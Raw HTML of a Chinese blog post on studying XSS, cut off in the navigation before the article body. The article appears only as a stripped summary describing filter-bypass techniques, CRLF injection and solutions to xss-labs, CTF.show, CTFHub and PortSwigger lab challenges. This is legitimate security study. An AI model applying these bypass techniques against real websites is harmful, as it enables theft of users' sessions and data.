<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>xss学习 | Sherlock</title><meta name="keywords" content="xss"><meta name="author" content="Sherlock"><meta name="copyright" content="Sherlock"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="xss学习"><meta name="application-name" content="xss学习"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="xss学习"><meta property="og:url" content="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/index.html"><meta property="og:site_name" content="Sherlock"><meta property="og:description" content="基础简介网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web"><meta property="og:locale" content="en"><meta property="og:image" content="http://example.com/img/Sherlock.jpg"><meta property="article:author" content="Sherlock"><meta property="article:tag" content="智商不够,勤勉来凑;眼神不太好"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/img/Sherlock.jpg"><meta name="description" content="基础简介网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":["🔍 分享与热心帮助","🤝 喜欢团结协作","🏃 脚踏实地行动派","💢 壮汉人狠话不多"]},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: Sherlock","link":"Link: ","source":"Source: Sherlock","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Sherlock',
  title: 'xss学习',
  postAI: '',
  pageFillDescription: '基础, 简介, 分类, 补充, CRLF注入漏洞, 绕过姿势, 拼接绕过, 函数替换, 嵌套绕过, url编码绕过, scr和href属性, 1.src属性, 2.href属性, ()绕过, 单引号过滤, 长度限制, 分号绕过, xss挑战之旅, level-1, level-2, level-3, level-4, level-5, level-6, level-7, level-8（HTML实体绕过）, level-9（http）, level-10, level-11, level-12, level-13, level-14, level-15（文件包含）, level-16（替换空格）, CTF.show, web316-web319, web320-web326, web327, CTFHub-XSS, 反射型, 过滤空格, bp实验室, Lab DOM XSS in innerHTML sink using source location.search, Lab DOM XSS in jQuery anchor href attribute sink using location.search source, Lab DOM XSS in jQuery selector sink using a hashchange event, Lab：将 XSS 反射到带有尖括号 HTML 编码的属性中, Lab：将 XSS 存储到带有双引号 HTML 编码的锚点 href 属性中, Lab：将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中, Lab： document.write 接收器中的 DOM XSS 使用选择元素内的源 location.search, Lab：AngularJS 表达式中的 DOM XSS带有尖括号和双引号 HTML 编码, Lab：反射型 DOM XSS, Lab：存储的 DOM XSS基础简介网站中包含大量的动态内容以提高用户体验比过去要复杂得多所谓动态内容就是根据用户环境和需要应用程序能够输出相应的内容动态站点会受到一种名为跨站脚本攻击的威胁而静态站点则完全不受其影响恶意攻击者会在页面里插入恶意代码当用户浏览该页之时嵌入其中里面的代码会被执行从而达到恶意攻击用户的目的漏洞通常是通过的输出函数将代码输出到页面中通过用户本地浏览器执行的所以漏洞关键就是寻找参数未过滤的输出函数分类反射型非持久化攻击者事先制作好攻击链接需要欺骗用户自己去点击链接才能触发代码服务器中没有这样的页面和内容一般容易出现在搜索页面型由于危害较小我们将其归为反射型存储型持久化代码是存储在服务器中的如在个人信息或发表文章等地方加入代码如果没有过滤或过滤不严那么这些代码将储存到服务器中每当有用户访问该页面的时候都会触发代码执行这种非常危险容易造成蠕虫大量盗窃虽然还有种型但是也还是包括在存储型内型与反射型的区别在型中输入的内容并不会出现在响应体里面源码里面也不会响应体是我的输入会经过后端经过后端渲染后再返回到前端型是直接通过前端的代码把我的输入插入到页面中进行实时渲染这个时候并不是后端反应给我的型没有向后端发起任何请求而按可以看到输入的内容插入到源码中是因为其返回的是实时渲染的结果补充伪协议就是把后面的代码当来执行使用函数把预定义的字符转换为实体防止浏览器将其作为元素但是默认是只编码双引号的而且单引号无论如何都不转义预定义的字符是和号成为双引号成为单引号成为小于成为大于成为注入漏洞这也就牵扯到漏洞了在协议中被用来分隔请求和响应中的各个部分是回车符和换行符的缩写它们通常被一起使用来表示一行的结束漏洞也称为报头注入漏洞是一种应用程序安全漏洞攻击者可以利用这个漏洞向响应中注入任意的头或者响应体一般攻击者可以通过在输入中注入字符来改变响应的内容从而实现恶意操作比如有一个搜索关键词的网站利用的形式传参如果该网站存在漏洞那么我们就可以利用回车符换行符进行绕过过滤我们抓一下包看一下返回包浏览器会根据第一个把包分成和然后将体显示出来于是我们这里这个标签就会显示出来造成一个浏览器的是浏览器应对一些反射型做的保护策略当中含有相关特征的时候就会过滤掉不显示在页面中所以不能触发怎样才能关掉一般来说用户这边是不行的只有数据包中头含有并且值为的时候浏览器才不会开启我们可以将注入到数据包中再用两个来注入代码这样就成功地绕过了浏览器并且执行我们的反射型绕过姿势拼接绕过函数替换以上只是利用标签进行举例也可以在别的标签中使用嵌套绕过在这一段代码中由于标签名被拆分成两部分浏览器会将第一个尖括号视为标签名的起始符号而第二个尖括号则是标签的起始符号导致浏览器误以为有两个标签被嵌套在一起从而实现我们的攻击编码绕过需要注入点存在属性或者属性才可以利用编码转义注意在解析过程中不能对协议类型进行任何的编码操作和属性属性总的来说属性通常用于指定外部资源的让浏览器从指定的中获取资源并加载它们标签属性用于指定引入外部文件的标签属性用于指定要显示的图像的标签属性用于指定要嵌入的另一个文档的和标签属性用于指定要播放的音频或视频的属性总的来说属性通常用于指定链接目标的或外部资源的以及用于指定基准或图像地图中区域的标签属性用于指定链接目标的标签属性用于指定外部样式表的标签属性用于指定基准所有相对都将以该为基础标签属性用于指定图像地图中区域的绕过利用反引号绕过单引号过滤可以利用斜杠替换利用反引号替换长度限制可以利用拆分法利用函数将字符串解析为可执行的代码从而进行拼接分号绕过当只过滤了分号时可以利用花括号进行语句隔离挑战之旅靶场欢迎用户没有任何过滤直接弹出弹窗进入下一关没有找到和相关的结果搜索被双引号包含所以我们需要先包含双引号后再或者弹出弹窗进入下一关没有找到和相关的结果然后再点击一下输入框就成功了没有找到和相关的结果没有找到和相关的结果利用浏览器自动校正轻微语法错误没有找到和相关的结果该题有多种基本上只要把前几题改下大小写就可以了没有找到和相关的结果全转换成小写了大小写不管用但是可以双写绕过实体绕过友情链接可以用实体来绕过过滤实体字符实体是用一个编号写入代码中来代替一个字符在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读您的链接不合法有没有友情链接友情链接在上题的基础上再添上就可以了没有找到和相关的结果当一个元素里面有两个时那么只有第一个属性会被浏览器解析而第二个属性会被忽略没有找到和相关的结果在里面进行修改就行和上题不同的是要在里面改这题在里面改就可以了或者考到了杂项不会文件包含指令用于包含外部的文件包含的内容将作为指定元素的子节点属性的值可以是一个表达式返回一个文件名默认情况下包含的文件需要包含在同一个域名下所以这题我们只需要包含第一题的漏洞就好了替换空格是把光标移到同一行的顶头回车是把光标移到下一行换行用代替空格使用替身就是将或者当成空格使用在中这样是合法的除了外后面几题过滤了所以解题如下可以通过在输入框输入一串字符比如我输入了然后查看回显有回显说明没有被过滤掉无回显说明被过滤掉了通过查看网址发现空格被替换成了加号过滤了空格可以用或者来代替空格所以解题如下后面几题都可以用上述的方法发信人必须是然后信的内容是的内容就好了反射型该题没有任何过滤最开始我只在第一行里面构造如下提交之后确实会访问该网站但是查的时候发现没有任何的后面再看眼页面发现需要利用第二行发送一个给所以如下发送后在查看获取过滤空格只要空格变为就好啦实验室本实验在搜索博客功能中包含一个基于的跨站点脚本漏洞它使用赋值该赋值使用来自的数据更改元素的内容最开始在搜索框中输入的时候并没有成功执行通过查看元素的时候发现该行代码成功注入但是没有执行后面看解析视频的时候说是因为同步的问题浏览器的自我保护机制于是我们再思考思考有什么是可以被执行的即元素我们运用的也仅仅是一个报错罢了所以尝试在输入框内输入点击发送页面成功回显于是通过这个方法我们也可以执行任意的代码来达到我们的目的该题先是尝试了在评论区里面评论以及提交反馈处但是都失败了后面查看了一下提交反馈界面的源码发现了以下代码这是中的一种文档就绪函数即在加载完成后执行其中的代码它等价于中的这是选择器用于选取为的元素这是中用于设置元素属性的方法在这里它设置了为的元素的属性这一部分使用了中的对象来获取当前页面中查询参数的值首先通过获取当前页面的查询参数部分然后使用对象来解析这个查询参数字符串最后调用方法获取名为的参数的值看到网址处尝试性在后面输入检查按键发现输入内容已经进入了后面如下于是我们把输入的内容改为然后再点击按键解决问题要求要解决该实验室问题请向受害者提供一个漏洞利用程序在其浏览器中调用函数进入实验室查看源代码代码如下这段代码是用编写的监听浏览器中哈希值后面的部分的变化当哈希值发生变化时它会查找页面上带有特定标题的元素并将页面滚动到该元素位置具体来说这一行代码是当浏览器的哈希值发生变化时触发的事件处理程序这一行代码是查找页面上包含特定标题的元素它首先解码哈希值由函数完成然后使用选择器查找带有指定标题的元素查找结果将被存储在变量中这一行代码是将页面滚动到包含特定标题的元素处它首先检查是否找到了符合条件的元素通过检查变量是否存在如果找到了则使用方法将其滚动到可见区域这段代码的功能是让页面在加载后根据中的哈希值自动滚动到对应标题的部分页面源码中的元素就是文章的标题网上找到的关于此函数的相关漏洞链接发现了有意思的地方如下在很多情况下都需要选择器但此代码也可以创建元素上面的意思就是说如果未找到选择器中要查找的元素那么会自动创建元素这样子的话我们可以直接在后面加上代码点击回车会有弹窗出现但是只能够触发一次下一次就失败无法访问网站所以直接把该链接给受害者的办法是行不通的需要换一种思路首先加载然后我们再把加载到该中这样便可以触发一次哈希更改事件所以我们在提供的漏洞利用程序中的部分可以这样写到测试该漏洞成功把它发给受害者题目解决将反射到带有尖括号编码的属性中要求此实验室在搜索博客功能中包含一个反映的跨站点脚本漏洞其中尖括号是编码的要完成此实验请执行跨站点脚本攻击注入属性并调用函数在搜索框处随机输入一串字符然后检查元素如下于是我们可以尝试逃出双引号首先尝试输入失败检查元素发现特殊符号被转化为实体接着尝试失败没有弹窗接着尝试另一种方法鼠标经过相关元素弹窗成功题目解决将存储到带有双引号编码的锚点属性中要求该实验在评论功能中包含一个存储的跨站点脚本漏洞要完成此实验请提交一条评论该评论在单击评论作者姓名时调用函数随便点进一篇文章先随便提交一条评论接着返回查看评论如下点击评论者名字的话会自动跳转到你输入进去的网址所以我们有了思路在写评论中让你输入网址的地方利用伪协议输入提交评论题目解决的组成是协议加上地址所以我们用伪协议可以成功将反射到带有尖括号编码的字符串中要求此实验室在尖括号编码的搜索查询跟踪功能中包含反映的跨站点脚本漏洞反射发生在字符串内要完成本实验请执行跨站点脚本攻击突破字符串并调用函数在搜索栏中搜索文章名字后右键检查元素发现了相关的代码如下最开始的思路被题目带歪了一直在思考着怎么突破下面的双引号包括当然最终的尝试以失败告终然后就没有思路开始看下面的讲解视频发现他是突破上面变量的单引号包括恍然大悟进行尝试尝试失败但是成功逃脱了单引号包括要解决的就是后面遗留的所以我们可以自己再创造一个变量出来解决这个问题题目解决不得不说思路得扩大一点不能只局限于一处要多看看其他地方有没有可以突破的地方接收器中的使用选择元素内的源要求此实验室在股票检查器功能中包含基于的跨站点脚本漏洞它使用函数将数据写入页面函数使用来自的数据进行调用您可以使用网站进行控制数据包含在选择元素内要完成此实验请执行跨站点脚本攻击该攻击会突破元素并调用函数相关的代码如下这段代码创建了一个元素其中包含了一组商店名称作为选项它还根据查询参数中的值选择了一个默认选项让我们逐行解释代码的功能定义了一个包含商店名称的数组使用获取了当前页面查询参数中名为的值并将其存储在变量中使用方法输出了一个元素的开始标签检查是否存在参数如果存在就在中添加一个被选中的选项显示当前的值遍历商店数组对每个商店创建一个元素并将其添加到中输出元素的结束标签通过这段代码你可以在页面上创建一个下拉菜单其中包含了预定义的商店选项并且可以根据中的参数自动选择默认选项于是我们尝试在中添加参数然后回车检查元素变化如下题目告诉我们说要突破标签所以我们可以让它提前闭合如下后面未闭合的标签我们不需要去管浏览器会自动修复回车后如下题目解决表达式中的带有尖括号和双引号编码该实验在搜索功能中的表达式中包含基于的跨站点脚本漏洞是一个流行的库它扫描包含属性也称为指令的节点的内容当指令添加到代码中时您可以执行双花括号内的表达式当对尖括号进行编码时此技术非常有用要完成此实验请执行跨站点脚本攻击该攻击执行表达式并调用函数根据题目提供的相关描述在谷歌上面进行搜索得到了一篇相关的非常有用的文章由于尖括号被编码了所以我们不能使用相关特殊字符便尝试用双花括号首先输入输出为表明应用很容易受到客户端模板注入的影响默认情况下作用域对象包含另一个名为构造器的对象该对象包含一个也被称为构造器的函数此函数可用于动态生成和执行代码而这正是我们执行的所需要的所以构造为题目解决反射型本实验演示了反射漏洞当服务器端应用程序处理请求中的数据并在响应中回显数据时就会出现反射漏洞然后页面上的脚本以不安全的方式处理反射的数据最终将其写入危险的接收器要完成本实验请创建一个调用函数的注入先打开进入实验室后打开然后在搜索框中随便输入字符串比如到的代理的历史中找到把它发送到中该条目具体内容如下我们可以尝试突破双引号包括即发现行不通双引号会自动被转义于是我们可以自己先给它加个转义而转义符也是可以被转义的这样子我们就可以突破双引号了为如下成功逃脱弹窗成功题目解决中的作用后面的内容是一个代码片段它尝试执行一个弹窗警告框然而在这种情况下这段代码被包含在双引号中并且在外面包裹了反斜杠这样做是为了避免格式出错因为双引号和反斜杠都是字符串中的特殊字符需要进行转义处理总之的作用是对搜索条件进行逻辑操作而这个搜索条件中包含了一个被排除的代码片段存储的按照上一题的思路来做同样的评论部分都为文件观察到位于最后的位置于是按照上题在输入框可以这样写回车之后发现并没有奏效检查响应发现给分别都做了转义处理于是失败了查看题解是写在评论的内容中回车后点返回到博文成功弹窗题目解决根据题解所说这样子之所以可以奏效是因为为了防止该网站使用函数对尖括号进行编码但是当第一个参数是字符串时该函数仅替换第一个匹配项我们利用此漏洞只需在评论的开头添加一组额外的尖括号即可这些尖括号将被编码但任何后续的尖括号都不会受到影响使我们能够有效地绕过过滤器并注入',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2025-04-20 20:30:03',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/Sherlock.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Sherlock</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> Search</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/cors/" style="font-size: 1.05rem;">cors<sup>1</sup></a><a href="/tags/csrf/" style="font-size: 1.05rem;">csrf<sup>1</sup></a><a href="/tags/php/" style="font-size: 1.05rem;">php<sup>5</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>3</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>3</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/ssti/" style="font-size: 1.05rem;">ssti<sup>2</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>3</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.05rem;">前端<sup>2</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span><a class="card-more-btn" href="/archives/" title="More">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">August 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">July 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/06/"><span class="card-archive-list-date">June 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">May 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">April 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">March 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">February 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">January 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div 